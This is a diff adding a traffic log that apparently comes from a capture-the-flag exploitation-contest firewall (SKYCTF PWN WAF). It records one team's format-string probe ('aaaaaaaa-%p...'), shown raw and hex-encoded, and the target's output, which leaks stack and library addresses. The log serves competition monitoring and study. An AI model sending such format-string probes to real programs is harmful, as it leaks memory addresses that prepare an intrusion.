@@ -1,0 +1,16 @@
+// Date: 2021-11-27 02:02:15
+// SKYCTF PWN WAF
+// Deved By I0gan
+team_name: j2che2ry
+
+user_name: j2che2ry
+
+
+<-------------------- read ------------------>
+aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
+
+r_0 = "\x61\x61\x61\x61\x61\x61\x61\x61\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x2d\x25\x70\x0a"
+
+<-------------------- write ----------------->
+aaaaaaaa-0x7ffee3cbfe40-0x100-0x7f43eb1c5360-0x7f43eb494770-0x7f43eb6bb700-0x7ffee3cbfe5e-0x2400000000000000-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0xa70252d7025-0x7ffee3cbff48
+--+--
